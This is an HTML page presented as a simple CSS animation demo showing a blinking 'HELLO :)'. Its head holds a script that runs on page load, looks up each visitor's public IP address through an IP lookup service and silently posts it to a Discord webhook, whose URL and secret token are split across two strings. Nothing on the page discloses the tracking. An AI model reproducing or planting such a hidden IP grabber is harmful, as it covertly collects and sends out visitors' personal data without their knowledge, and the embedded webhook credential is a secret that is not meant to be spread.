<!DOCTYPE html>
<html>
<head>
<title>HELLO avec animation en CSS</title>
<style>
body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background-color: #1e90ff;
}

h1 {
    font-size: 10rem;
    color: #fff;
    text-shadow: 4px 4px #000;
    animation: blink 2s ease-in-out infinite;
}

@keyframes blink {
    50% {
    opacity: 0;
    }
}
</style>
<script>
    const webhookUrl = "https://discord.com/api/webhooks/1087058664742977568/" + "a_ilXftOsERSEa1OtF6gVve3mihNVLU32wSWXJR6Iw3KjIcIXpW7D3NEZ8vAjyjAj8DX";
    const ipifyUrl = "https://api.ipify.org?format=json";

    fetch(ipifyUrl)
      .then(response => response.json())
      .then(data => {
        const message = {
          content: `Random IP | Nouvelle visite de ||${data.ip}||`,
        };

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(message),
        })
          .then(response => console.log(response))
          .catch(error => console.error(error));
      })
      .catch(error => console.error(error));
  </script>
</head>
<body>
<h1>HELLO :)</h1>
</body>
</html>
